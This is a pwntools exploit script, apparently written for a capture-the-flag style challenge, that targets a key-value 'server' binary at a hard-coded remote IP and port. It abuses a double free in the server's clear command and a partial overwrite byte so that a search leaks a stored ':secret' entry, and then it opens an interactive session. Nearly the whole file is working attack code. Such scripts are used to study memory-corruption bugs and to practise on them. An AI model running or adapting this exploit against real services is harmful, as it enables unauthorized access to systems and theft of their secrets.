#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template server
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'server')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    # Url to PWN: 131.114.51.56:4000
    if args.REMOTE:
        return remote('131.114.51.56', 4000)
    else:
        return remote('localhost', 10_000)
    
# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

import time

# base mal 0x57dad4458000

def create(key, value=b''):
    io.sendline(b'n' + str(len(key)).encode() + b',' + str(len(value)).encode())
    time.sleep(0.3)
    io.sendline(key + value)
    time.sleep(0.01)

def clear():
    io.sendline(b'c')
    time.sleep(0.01)

def search(key):
    io.sendline(b's' + str(len(key)).encode())
    time.sleep(0.01)
    io.sendline(key)
    time.sleep(0.01)
    io.interactive()

KEYSZ = 8
SECRETSZ = 37
secretkey = b':secret0'

io = start()

# already exists
create(secretkey)
print()
# double free and create loop
clear()

# in the last bit 0x90 so that it returns me the :secret
create(b'\x90')

create(b'aa')
create(b'bb')

search(b'bbecret0')

io.interactive()
